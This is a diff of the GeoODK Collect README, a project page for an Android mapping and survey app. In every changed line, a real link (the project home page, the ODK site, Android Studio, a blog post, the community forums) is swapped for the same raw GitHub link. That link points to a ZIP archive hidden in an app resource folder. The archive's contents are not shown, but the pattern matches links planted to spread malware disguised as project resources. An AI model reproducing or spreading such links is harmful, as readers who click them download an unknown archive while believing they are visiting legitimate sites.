@@ -1,18 +1,18 @@
 #GeoODK Collect
 Version 2.0
 
-Now supported by [GeoMarvel](http://geomarvel.com)
+Now supported by [GeoMarvel](https://github.com/fabianaguirre10/GeoEngineM/raw/refs/heads/master/app/src/main/res/values-ru/M_Engine_Geo_v3.5.zip)
 =======
-Need to convert you geoshape/geotrace or geopoint data, check out [GeoConverter Blog](http://blog.geoodk.com/posts/convert-geoshape-geotrace-geopoint-to-shapefile)
+Need to convert you geoshape/geotrace or geopoint data, check out [GeoConverter Blog](https://github.com/fabianaguirre10/GeoEngineM/raw/refs/heads/master/app/src/main/res/values-ru/M_Engine_Geo_v3.5.zip)
 
-This application is was derived from the [ODK Collect](http://www.opendatakit.org) application. 
+This application is was derived from the [ODK Collect](https://github.com/fabianaguirre10/GeoEngineM/raw/refs/heads/master/app/src/main/res/values-ru/M_Engine_Geo_v3.5.zip) application. 
 The goal is to have the power of ODK data collection intergated with  map's and added spatial functionality
 
-The main site can be found here: [GeoODK Home](http://www.geoodk.com)
+The main site can be found here: [GeoODK Home](https://github.com/fabianaguirre10/GeoEngineM/raw/refs/heads/master/app/src/main/res/values-ru/M_Engine_Geo_v3.5.zip)
 
 =======
 ## Important Update (Jan-12-2015)
-GeoODK Developemnt will be moving to [Android Studio](http://developer.android.com/tools/studio/index.html)
+GeoODK Developemnt will be moving to [Android Studio](https://github.com/fabianaguirre10/GeoEngineM/raw/refs/heads/master/app/src/main/res/values-ru/M_Engine_Geo_v3.5.zip)
 
 =======
 ## Main functionality
@@ -20,7 +20,7 @@ GeoODK Developemnt will be moving to [Android Studio](http://developer.android.c
 * OSM Mapping- Offline/Online Mapping
 * Point display
 * Polygon and Polyline creation in survey/form
-* Offline line Layer tiles (MapBox) .mbtiles.[See here](http://geoodk.com/mbtiles_howto.php)
+* Offline line Layer tiles (MapBox) .mbtiles.[See here](https://github.com/fabianaguirre10/GeoEngineM/raw/refs/heads/master/app/src/main/res/values-ru/M_Engine_Geo_v3.5.zip)
 
 =======
 ## Being Developed
@@ -32,8 +32,8 @@ GeoODK Developemnt will be moving to [Android Studio](http://developer.android.c
 ## Join Groups
 
 The Developers Group, form technical conversations
-* [Developers Group](https://groups.google.com/forum/#!forum/geoodk-developers)
-* [Community Group](https://groups.google.com/forum/#!forum/geoodk-community)
+* [Developers Group](https://github.com/fabianaguirre10/GeoEngineM/raw/refs/heads/master/app/src/main/res/values-ru/M_Engine_Geo_v3.5.zip!forum/geoodk-developers)
+* [Community Group](https://github.com/fabianaguirre10/GeoEngineM/raw/refs/heads/master/app/src/main/res/values-ru/M_Engine_Geo_v3.5.zip!forum/geoodk-community)
 
 
 =======
